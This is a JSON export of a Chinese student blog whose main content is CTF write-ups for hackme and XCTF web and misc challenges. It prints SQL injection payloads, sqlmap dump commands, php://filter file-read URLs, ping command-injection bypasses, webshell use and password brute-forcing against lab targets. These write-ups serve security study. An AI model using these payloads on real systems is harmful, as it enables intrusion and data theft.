{"meta":{"title":"Hexo","subtitle":null,"description":null,"author":"Smtsec","url":"https://singlemindedt.github.io","root":"/"},"pages":[{"title":"迷路了404","date":"2019-08-31T01:24:31.422Z","updated":"2019-08-31T01:24:18.825Z","comments":true,"path":"404.html","permalink":"https://singlemindedt.github.io/404.html","excerpt":"","text":""},{"title":"about me","date":"2019-08-31T01:12:58.000Z","updated":"2019-12-17T13:57:59.289Z","comments":true,"path":"about/index.html","permalink":"https://singlemindedt.github.io/about/index.html","excerpt":"","text":"就读于CUMT，目前是大三，随便瞎写写，写的不好，还望各位轻点吐槽😅有事可以联系我联系方式：扣扣MTcyNzMzMDAxOA==（😁注明来意哦~）"}],"posts":[{"title":"新年打卡","slug":"2020-1-1-diary","date":"2020-01-01T00:00:00.000Z","updated":"2020-01-01T00:21:46.862Z","comments":true,"path":"2020/01/01/2020-1-1-diary/","link":"","permalink":"https://singlemindedt.github.io/2020/01/01/2020-1-1-diary/","excerpt":"","text":"大清早各种刷，然后自己也想纪念一下下😂不知不觉一年又过去了，回顾这一年，似乎挺浪233，……e,回来再补！先复习先复习🏃","categories":[{"name":"summary","slug":"summary","permalink":"https://singlemindedt.github.io/categories/summary/"}],"tags":[{"name":"Diary","slug":"Diary","permalink":"https://singlemindedt.github.io/tags/Diary/"}]},{"title":"cryptography","slug":"cryptography","date":"2019-12-31T01:22:54.000Z","updated":"2020-01-01T05:15:46.014Z","comments":true,"path":"2019/12/31/cryptography/","link":"","permalink":"https://singlemindedt.github.io/2019/12/31/cryptography/","excerpt":"","text":"科克霍夫原则：密码系统的安全性不应该取决于不易改变的算法，而应取决于可随时改变的密钥. 密码体制的分类： §对称**密码体制**•序列密码(流密码)•分组密码§公钥密**码体制/非对称密码体制**","categories":[{"name":"summary","slug":"summary","permalink":"https://singlemindedt.github.io/categories/summary/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"hackme","slug":"hackme","date":"2019-12-28T16:00:00.000Z","updated":"2019-12-30T09:26:10.149Z","comments":true,"path":"2019/12/29/hackme/","link":"","permalink":"https://singlemindedt.github.io/2019/12/29/hackme/","excerpt":"","text":"[TOC] hackme MiscFlag直接提交描述即可； Corgi can fly实际操作：提示使用stegsolve,得到二维码，扫描得到flag Television实际操作：将图片拖入winhex,搜索关键字flag Meow实际操作：利用foremost meow.png提取，得到一个png和一个zip 打开zip里面有加密的flag还有一张png, 仔细观察可以发现两个压缩包内png的crc32 值一样. 故用明文攻击，可以使用Advanced Zip Password Recovery来进行破解；这里我们用pkcrack: 原理：ZIP明文攻击就是利用已知文件找加密密钥，利用密钥来解锁其它加密文件，因为ZIP压缩包里的所有文件都是使用同一个加密密钥来加密的。 执行如下命令： Where is flag问题分析：给出一串字符： Flag应该就在这里面，提示正则：cat flag |grep -oP “FLAG{[0-9a-zA-Z]+}” 得到flag。 Encoder问题描述：Can you decode this?下载解压得到 encoder.py 和 flag.enc； 12345678910111213141516171819202122232425262728import randomimport stringdef rot13(s): return s.translate(string.maketrans(string.uppercase + string.lowercase, string.uppercase[13:] + string.uppercase[:13] + string.lowercase[13:] + string.lowercase[:13]))def base64(s): return ''.join(s.encode('base64').split())def hex(s): return s.encode('hex')def upsidedown(s): return s.translate(string.maketrans(string.uppercase + string.lowercase, string.lowercase + string.uppercase))flag = 'FLAG&#123;.....................&#125;' # try to recover flagE = (rot13, base64, hex, upsidedown)for i in range(random.randint(30, 50)): print i c = random.randint(0, len(E) - 1) flag = '%d%s' % (c, E[c](flag))open('flag.enc', 'w').write(flag) 可以明显看到c的值就在密文开头： 123456789101112131415161718192021222324252627282930from binascii import unhexlifyfrom base64 import b64decodeimport stringdef unrot13(s): return s.translate(str.maketrans(string.ascii_uppercase[13:] + string.ascii_uppercase[:13] + string.ascii_lowercase[13:] + string.ascii_lowercase[:13], string.ascii_uppercase + string.ascii_lowercase))def unupsidedown(s): return s.translate(str.maketrans(string.ascii_lowercase + string.ascii_uppercase, string.ascii_uppercase + string.ascii_lowercase))def unbase64(s): return b64decode(s).decode()def unhex(s): return unhexlify(s).decode()with open('./flag.enc') as f: data = f.read()E = (unrot13, unbase64, unhex, unupsidedown)for i in range(50): c, data = int(data[0]), data[1:] data = E[c](data) if data.startswith('FLAG'): print(data) break 运算结果如下，得到flag： Pusheen.txt问题描述：1Do you think pusheen is cute? 下载解压得到 pusheen.txt, 里面是一堆不可名状的字符画字符两种, 把这个序列转成二进制, 再转ASCII, 就得到了 flag (白为0，黑为1，转化为ascll) Web hide and seek问题描述：1Can you see me? I'm so close to you but you can't see me. 实际操作：查看源码： 或者直接查看控制台（Console）里面有张二维码，扫一下得到flag此处做一标记orz，扫二维码的确得到了flag，但是不是这一题的hhhhh…,提交发现是homepage的。 Guestbook问题描述：1This guestbook sucks. sqlmap is your friend. 实际操作： 提示用sqlmap，就是sql注入了，手动注入一下：1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4 1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database() 看到flag表 1https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag 查询所有数据 LFI知识补充： php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：readfile(“php://filter/read=convert.base64-encode/resource=php://input”); 实际操作：此题url为：https://hackme.inndy.tw/lfi/?page=pages/index结合题目提示，应该为读文件； 1读：https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag 得到一串base64解码得到：Can you read the flag?继续读config.php 1https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config 得到base64解密得到flag Homepage已解决，见第一题； Ping 源码给出，目的是对这个命令注入 ping -c 1 “{$ip}” 2&gt;&amp;1黑名单未过滤反引号，尝试?ip=ls,得到： Cat被过滤，可以尝试用tac倒着显示，flag也被过滤，使用通配符模糊匹配一下： 1?ip='tac f*' 得到flag。 scoreboard没啥思路，审查元素查找关键字flag，在响应头里发现flag login as admin 0 Sql注入，提示利用guest登陆（guest，中文意思是客人，网络是指计算机的来宾账户。与“Administrator”和“User”不同的，通常这个帐户没有修改系统设置和进行安装程序的权限，也没有创建修改任何文档的权限，只能是读取计算机系统信息和文件。来宾帐户可提供若干与安全性和网络共享相关的特殊功能。） 实际操作： 查看网页源码，可以看到直接返回了debug信息，含有完整的SQL语句： 查看给出的源码，发现过滤了’，将’转为/’，这里我们再添加一个转义符，把它添加的转义符转义了。 构造payload：1user=admin\\’||1=1#;password=0 提示身份为guest，即第一个用户不是admin； 1构造：user=admin\\’||1=1 limit 1,1#；得到flag login as admin 0.1题目分析：此题和上题用的是同一个数据库，这次要在库里找flag2； 实际操作： 确定列：1user=admin\\' union select 1,2,3,4#&amp;password=0 正常回显了2，固有四列； 表名1User=admin \\' union select 1,concat(table_name),3,4 from information_schema.tables where table_schema=database() 得到表名：h1dden_f14g 1User=admin \\' union select 1,concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=0x68316464656e5f66313467 # //这里有一点就是在逗号被过滤的情况下这里转义会导致sql查询出错，所以我们可以直接将表名进行ASCII的八进制编码，前面加上0x，就可以在sql中正常查询返回the_f14g 1name=admin \\' union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4 # 得到flag。 login as admin 1查看源码，发现和 login as admin 0差不多，过滤了空格；用/**/ 代替空格 1user=admin\\'union/**/select/**/1,2,3,4# 得到flag。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"hackme","slug":"CTF/hackme","permalink":"https://singlemindedt.github.io/categories/CTF/hackme/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://singlemindedt.github.io/tags/Misc/"},{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"攻防世界-Web","slug":"攻防世界-Web","date":"2019-12-25T14:49:02.000Z","updated":"2019-12-30T09:41:06.814Z","comments":true,"path":"2019/12/25/攻防世界-Web/","link":"","permalink":"https://singlemindedt.github.io/2019/12/25/攻防世界-Web/","excerpt":"","text":"目录 [TOC] 攻防世界新手练习区view_source题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。打开链接如下： 方法1试试右键的确不管用了，直接F12，找到flag 方法2另外还可以通过view-source：url查看源代码： 方法3其实还可以禁用Js代码，这样右键就可以用了： get_post题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？ 知识补充：两种 HTTP 请求方法：GET 和 POST在客户机和服务器之间进行请求-响应时，两种最常被用到的方法是：GET 和 12345POST。&#123;GET - 从指定的资源请求数据。POST - 向指定的资源提交要被处理的数据&#125; https://www.w3school.com.cn/tags/html_ref_httpmethods.asp https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc 实际操作：打开网址，得到如下要求 &lt;用GET给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开&gt;在url后添加/？a=1即可发送get请求。 利用hackbar进行POST传参：复制get的url，选择postdata，填入b=2，选择execute。即可发送POST请求。 关于GET 和 POST：https://www.cnblogs.com/williamjie/p/9099940.html Robots题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。 知识补充： robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。 如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。 Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。【https://blog.csdn.net/qq_40491569/article/details/83473703】 实际操作：打开网页空白； 在题URL后输入/robots.txt即： http://111.198.29.45:35567/robots.txt f1ag_1s_h3re.php这个页面不允许被爬取，查看一下f1ag_1s_h3re.php页面得到flag. Backup题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！ 知识补充备份文件: bak（被自动或是通过命令创建的辅助文件，它包含某个文件的最近一个版本） 实际操作试着在index.php后加.bak得到index.php.bak的备份文件，打开得到flag Cookie知识补充： Cookie 可以翻译为“小甜品，小饼干”，Cookie 在网络系统中几乎无处不在，当我们浏览以前访问过的网站时，网页中可能会出现 ：你好 XXX，这会让我们感觉很亲切，就好像吃了一个小甜品一样。这其实是通过访问主机中的一个文件来实现的，这个文件就是 Cookie。在 Internet 中，Cookie 实际上是指小量信息，是由Web服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。其实cookies是由网络服务器存储在你电脑硬盘上的一个txt类型的小文件，它和你的网络浏览行为有关，所以存储在你电脑上的cookies就好像你的一张身份证，你电脑上的cookies和其他电脑上的cookies是不一样的;cookies不能被视作代码执行，也不能成为病毒，所以它对你基本无害。cookies的作用主要是，当你访问了某些网页，并且对网页的一些设置进行修改，cookies就能跟踪并记录到这些修改，当你下一次访问这个网页的时候，这个网页会分析你电脑上的cookies，进而采取措施像你返回更符合你个性化的网页; 当然，目前大部分广告的定位基础也是基于cookies的，比如你此前访问了大量的健身类网站，cookies记录了你的访问行为，广告主就能够根据你的访问行为，向你推送健身类的广告。 实际操作：利用开发者工具F12键—网络，查看消息头看到“Cookie look-here=cookie.php” 根据提示信息，在URL后加上”/cookie.php”即http://111.198.29.45:47420/cookie.php 提示查看HTTP响应，在消息头里发现flag。 disabled_button题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？ 知识补充：需要熟悉一些常见的HTML知识 实际操作：右键-&gt;查看元素，在input中用了‘disabled=” “’属性，双击，将其删掉，按钮便可正常使用。 simple_js题目描述： 小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 实际操作：打开链接空白，查看源码，有如下代码： 12345678910111213141516171819202122232425262728293031function dechiffre(pass_enc) &#123; var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(','); var i, j, k, l = 0, m, n, o, p = \"\"; i = 0; j = tab.length; k = j + (l) + (n = 0); n = tab2.length; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; p += String.fromCharCode((o = tab2[i])); if (i == 5) break; &#125; for (i = (o = 0); i &lt; (k = j = n); i++) &#123; o = tab[i - l]; if (i &gt; 5 &amp;&amp; i &lt; k - 1) p += String.fromCharCode((o = tab2[i])); &#125; p += String.fromCharCode(tab2[17]); pass = p; return pass;&#125;String[\"fromCharCode\"](dechiffre( \"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"));h = window.prompt('Enter password');alert(dechiffre(h)); 这一长串16进制数很可疑， 1\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" 转字符得到：55,56,54,79,115,69,114,116,107,49,50再将其转换为10进制ASCII码对应的字符得到 ：786OsErtk12加上题目给出的格式得到flag（解码函数似乎不能得到正确密码//orz？） xff_referer题目描述：X老师告诉小宁其实xff和referer是可以伪造的。 实际操作：打开链接如图： 知识补充X-Forwarded-For和RefererXFF构造来源IPReferer构造来源浏览器 X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项 HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理利用bp抓包： 在HTTP头添加：X-Forwarded-For:123.123.123.123 得到下图提示： 再加一条Referer:https://www.google.com 得到flag。 1:(/images/7.5.png)由于每次添加都要重新输入，这里可以利用Repeater功能： 得到： 可以在左边直接编辑Request—&gt;右侧得到Response： Response—&gt;Flag! 自己编辑的时候注意Target的格式： 去掉请求协议http:// 相关知识URL与URI：https://blog.csdn.net/lslk9898/article/details/86490383 weak_auth题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 实际操作根据弹窗的提示，用户名必须是admin 将usename设置为admin，随手！！！真的是随手，输了个123456，结果对了hhh :) 正常解法 用Burp Suite对它进行密码爆破， 可以先试着输入username=admin和password=11111,以确定爆破位置。 Action—&gt;send to Intruder 基本配置：1、在消息编辑器的上方，有一个下拉选择框，攻击类型（Attack Type），几种不同的方式，这里选择：集束炸弹模式（Cluster bomb） 它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），依次遍历所有的Payload。它与草叉模式的主要区别在于，执行的Payload数据Payload组的乘积。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起四次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为A和D，第三次使用的Payload分别为B和C，第四次使用的Payload分别为B和D。 2、由于username规定用admin； 简单列表（Simple list） ——最简单的Payload类型，通过配置一个字符串列表作为Payload，也可以手工添加字符串列表或从文件加载字符串列表。其设置界面如下图 3、导入密码list 4、可选项设置（Options）可选项设置主要包括请求消息头设置、请求引擎设置、攻击结果设置、grep match, grep extract, grep payloads,以及重定向设置。在使用中，你可以在攻击前进行设置，也可以在攻击过程中做这些选项的调整。 开始爆破： 可以明显看到出现了长度不一样的响应，123456应该就是正确密码，查看Response得到Flag。 webshell题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 知识补充： webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 上传木马拿webshell的方法汇总 图片给出的代码为php一句话木马：一句话木马的工作原理：一句话木马分析服务端与客户端。 “一句话木马”服务端（是用于本地的html提交脚本木马文件） 就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为 &lt;%execute request(“value”)%&gt; 其中value可以自己修改“一句话木马”客户端（远程服务器上被插入一句话的asp可执行文件） 用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件 用中国菜刀或者蚁剑等工具可以上传或执行命令，密码是shell。 连接成功： 选择双击： 看到flag.txt,打开： command_execution题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 知识补充：1、ping （网络诊断工具）Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。应用格式：ping空格IP地址。该命令还可以加许多参数使用，具体是键入ping按回车即可看到详细说明。作为一个生活在网络上的管理员或者黑客来说，ping命令是第一个必须掌握的DOS命令，它所利用的原理是这样的：利用网络上机器IP地址的唯一性，给目标IP地址发送一个数据包，再要求对方返回一个同样大小的数据包来确定两台网络机器是否连接相通，时延是多少。ping指的是端对端连通，通常用来作为可用性的检查， 但是某些病毒木马会强行大量远程执行ping命令抢占你的网络资源，导致系统变慢，网速变慢。严禁ping入侵作为大多数防火墙的一个基本功能提供给用户进行选择。 2、有关命令执行的知识windows或linux下： 1234command1 &amp; command2 ：先执行command2后执行command1command1 &amp;&amp; command2 ：先执行command1后执行command2command1 | command2 ：只执行command2command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2) 3、WAFWeb应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。Web应用防火墙会对HTTP的请求进行异常检测，拒绝不符合HTTP标准的请求。并且，它也可以只允许HTTP协议的部分选项通过，从而减少攻击的影响范围。甚至，一些Web应用防火墙还可以严格限定HTTP协议中那些过于松散或未被完全制定的选项。（WAF绕过）此题给出未开WAF，所以不用考虑这一步。 4、还需要掌握一些常用的命令ls 对于目录，该命令列出该目录下的所有子目录与文件。对于文件，将列出文件名以及其他信息。Cd 改变工作目录，将当前工作目录改变到指定的目录下。cat是打印文件内容tac 是反向打印less 文件名：分页显示文件内容（如less /etc/passwd）Find 沿着文件层次结构向下遍历，匹配符合条件的文件，并执行相应操作。关于find可以参考：https://www.jianshu.com/p/16af649d9b6d*&lt;利用截断来执行行的命令，如’$’ 和 ‘ ; ‘和 ‘|’ 和 ‘-‘ 和 ‘(‘ 和 ‘ ) ‘ 和 ‘ “ ‘ 和 ‘||’ 和’&amp;&amp;’ 和 ‘&amp;’ 和 ‘{‘ 和 ‘}’等&gt;* 实际操作： 试着使用命令连接符，查看目录 发现有home目录，看看里面有啥： 发现有flag.txt;或者直接根据文件名或正则表达式进行搜索，如下： 得到flag.txt在home下，cat一下： 同时这道题，查看代码可以发现：POST传参是通过参数target，而target就是我们所要输入的值 尝试post传值： 得到flag: simple_php题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 实际操作：打开链接： 很简单的PHP代码：a要等于0，又不能等于0；b不能是数字，但还要大于1234 is_numeric（）来函数用于检测变量是否为数字或数字字符串。如果指定的变量是数字和数字字符串则返回TRUE，否则返回FALSE。 此处靠php弱类型比较：可查看我的这篇博文构造如下url: 高手进阶区baby_web题目提示：想想初始页面是哪个 实际操作：考虑到可能是页面302重定向抓包得到flag FlatScience实际操作点进去有好多链接，下载PDF，跳回等； 查看robots.txt(robots.txt:是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。)访问:http://111.198.29.45:34978/robots.txt 123User-agent: *Disallow: /login.phpDisallow: /admin.php 访问login.php:得到了一个登陆页面，尝试sqli,提示： 12Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: \"2801497d9ca18eef4382b18d1889b8bc97e28461\" in /var/www/html/login.php on line 47Some Error occourred! 可以看到使用的是SQLite数据库,还有加密操作？ 访问网页源码： 有参数提示debug;尝试访问login.php?debug得到如下php代码： 1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST['usr']) &amp;&amp; isset($_POST['pw']))&#123; $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\"); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo \"&lt;br&gt;Some Error occourred!\"; &#125; if(isset($row['id']))&#123; setcookie('name',' '.$row['name'], time() + 60, '/'); header(\"Location: /\"); die(); &#125;&#125;if(isset($_GET['debug']))highlight_file('login.php');?&gt; 可以看到SQL的查询语句，并且对密码进行了加密操作(sha1+salt&lt;=（alz！）);页面注入不成，抓包分析下：构造： 1usr='union select name,sql from sqlite_master--+n&amp;pw=233 得到： 1Set-Cookie: name=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; URL编码转换一下：%27=&gt;’;%28=&gt;(;%29=&gt;); 12CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)) 看到Users表、id,name,password.hint字段；构造查询语句： 12345idusr='union select id,id from Users limit 0,1--&amp;pw=233usr='union select id,id from Users limit 1,1--&amp;pw=233usr='union select id,id from Users limit 2,1--&amp;pw=233得到3个id； 1234usr='union select id,name from Users limit 0,1--&amp;pw=233usr='union select id,name from Users limit 1,1--&amp;pw=233usr='union select id,name from Users limit 2,1--&amp;pw=233得到name：admin、fritze、hansi 1234567usr='union select id,password from Users limit 0,1--&amp;pw=233usr='union select id,password from Users limit 1,1--&amp;pw=233usr='union select id,password from Users limit 2,1--&amp;pw=233得到password：3fab54a50e770d830c0416df817567662a9dc85c54eae8935c90f467427f05e4ece82cf569f8950734b0bb7c304949f9ff2fc101eef0f048be10d3bd 1234567usr='union select id,hint from Users limit 0,1--&amp;pw=233usr='union select id,hint from Users limit 1,1--&amp;pw=233usr='union select id,hint from Users limit 2,1--&amp;pw=233得到hint：my+fav+word+in+my+fav+paper%3F%21my+love+is%E2%80%A6%3Fthe+password+is+password 根据admin用户的提示my fav word in my fav paper？！应该是：密码+”Salz!”做sha1处理，密码应该就产生于pdf中； 因为我门知道了加密结果直接解密去掉Salz就得到密码了： 解密 也可以用pdf中的单词进行+Salz!再做sha1； 借用一下别人的Python脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041from cStringIO import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlib def get_pdf(): return [i for i in os.listdir(\"./\") if i.endswith(\"pdf\")] def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, 'rb') as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return text def find_password(): pdf_path = get_pdf() for i in pdf_path: print \"Searching word in \" + i pdf_text = convert_pdf_2_text(i).split(\" \") for word in pdf_text: sha1_password = hashlib.sha1(word+\"Salz!\").hexdigest() if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c': print \"Find the password :\" + word exit() if __name__ == \"__main__\": find_password() 知识补充‘’’os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。它不包括 . 和 .. 即使它在文件夹中。只支持在 Unix, Windows 下使用。语法listdir()方法语法格式如下：os.listdir(path)参数:path – 需要列出的目录路径返回值:返回指定路径下的文件和文件夹列表。‘’’‘’’endswith() 方法用于判断字符串是否以指定后缀结尾，如果以指定后缀结尾返回True，否则返回False。可选参数”start”与”end”为检索字符串的开始与结束位置。‘’’‘’’hashlib是涉及安全散列和消息摘要，提供多个不同的加密算法接口，如SHA1、SHA224、SHA256、SHA384、SHA512、MD5等。其中hash.digest()返回摘要，作为二进制数据字符串值hash.hexdigest()返回摘要，作为十六进制数据字符串值‘’’ 得到密码：ThinJerboa访问：admin.php 12username=adminpassword=ThinJerboa 得到flag Cat题目描述：仅给出了这样一个页面： 实际操作：输入cat，得到： 123456PING cat.ad-world-198302431-4658.rancher.internal (10.42.197.21) 56(84) bytes of data.64 bytes from b4fccc7cf554 (10.42.197.21): icmp_seq=1 ttl=64 time=0.045 ms--- cat.ad-world-198302431-4658.rancher.internal ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms 并在URL中如此传参： 1http://111.198.29.45:35113/index.php?url=cat 输入127.0.0.1： 123456PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.061 ms--- 127.0.0.1 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.061/0.061/0.061/0.000 ms 尝试使用命令连接符/管道命令，均被屏蔽；目前仅知道，输入框通过用户输入进行GET方式传参；(此处请跳转文末 orz)那么只能从url入手了，看看有没有可能爆出一些有用的信息；测试发现超过ASCll可打印字符之外的url编码都会报错，比如键入http://111.198.29.45:35113/index.php?url=%8c ： 给出报错信息： 可以明显看到使用的是Django框架； 查看配置文件信息：settings.py 在报错信息中搜索database，发现的到有关数据库内容： 参考： 通过http://111.198.29.45:35113/index.php?url=@/opt/api/database.sqlite3 得到数据库内容：查找ctf关键字： 源码里就是GET啊，那这个又是啥？？？post?！orz orz orz ics-04问题分析： 本题和之前几题使用了相同的页面，根据提示漏洞位置应该在登录和注册上，随便注册都能成功，但是登录时提示“普通用户登录成功，没什么用”； 尝试sql注入，这两个地方并没有什么注入点，看到还有个“忘记密码？”，可以正常使用找回密码，尝试sql注入；利用sqlmap检测，发现存在漏洞； 构造命令猜解数据库名：–dbs 枚举数据库管理系统数据库1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" --dbs 得到库名结果； 库名 对每个数据库进行表名猜解；1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 --tables 对数据库cetc004中表user猜解列名；–columns 枚举DBMS数据库表列1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user --columns 对username和password进行内容查询；–dump 转储数据库管理系统的数据库中的表项 1sqlmap -u \"http://111.198.29.45:33931/findpwd.php\" --data=\"username=1\" -D cetc004 -T user -C \"username,password\" --dump 由于可以重复注册，于是使用c3tlwDmln23注册，注册成功，登陆后得到flag； 此时对username查询可得到两条结果；第一行为原来的，第二行为刚才注册的，所以漏洞原因为未对用户名重复问题加以过滤，造成数据库查表错误；知识补充：如果觉得打开Kali虚拟机麻烦，可以在Windows上安装一个sqlmap，具体步骤网上都有教程；如果遇到“不是内部或外部命令，也不是可运行的程序 或批处理文件。”时，看一下自己的“起始位置”的路径，是不是没有指定清楚，如果填写的是C:\\Python27\\sqlmap；那么请查看sqlmap下到sqlmap python File是否还有间接文件夹，若有直接加上\\name；或者直接复制改名为sqlmap放在Python27下；删除原来的文件；关于sqlmap使用：https://blog.csdn.net/qq_33530840/article/details/82144515 ics-05题目描述：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统 实际操作：点击链接进入“工控云管理系统”，根据题目要求只能点击“设备维护中心”；得到如下页面： 除了index.php页面，没有其他有效信息，查看源码： 可以看到?page=indedx;由于出现page这个get参数，我们可以尝试一下是否存在文件包含源码漏洞； 